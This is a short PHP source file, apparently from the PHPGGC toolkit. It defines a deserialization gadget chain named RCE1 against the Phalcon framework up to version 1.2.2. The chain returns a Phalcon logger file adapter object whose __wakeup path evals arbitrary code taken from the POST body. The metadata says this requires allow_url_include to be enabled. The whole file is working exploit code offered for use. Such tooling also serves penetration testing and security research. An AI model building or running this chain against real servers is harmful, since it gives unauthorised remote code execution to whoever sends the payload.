<?php

namespace GadgetChain\Phalcon;

class RCE1 extends \PHPGGC\GadgetChain\RCE
{
    public static $type_description = 'RCE: eval(php://input)';
    public static $version = '<= 1.2.2';
    public static $vector = '__wakeup';
    public static $author = 'Raz0r';
    public static $information = '
        This chain does not expect parameters, will eval() any code supplied in 
        php://input (i.e. POST data). Requires allow_url_include = true.
    ';

    # No parameters expected
    public static $parameters = [];

    public function generate(array $parameters)
    {
        return new \Phalcon\Logger\Adapter\File();
    }

    public function test_setup()
    {
        throw new \PHPGGC\Exception("This GC cannot be tested.");
    }
}
